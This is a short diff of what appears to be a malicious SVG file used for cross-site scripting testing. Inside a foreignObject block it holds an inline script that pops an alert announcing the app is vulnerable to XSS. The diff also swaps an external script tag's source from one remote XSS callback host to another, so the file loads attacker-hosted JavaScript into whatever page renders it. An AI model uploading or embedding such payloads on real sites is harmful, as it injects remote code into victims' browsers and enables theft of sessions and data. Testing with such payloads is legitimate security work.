@@ -10,6 +10,6 @@
       <script type="text/javascript">
       alert('This app is probably vulnerable to XSS attacks!');
    </script>
-   <script src="https://lucysmulder.xss.ht"></script>
+   <script src="https://js.rip/Xss"></script>
    </foreignObject>
 </svg>
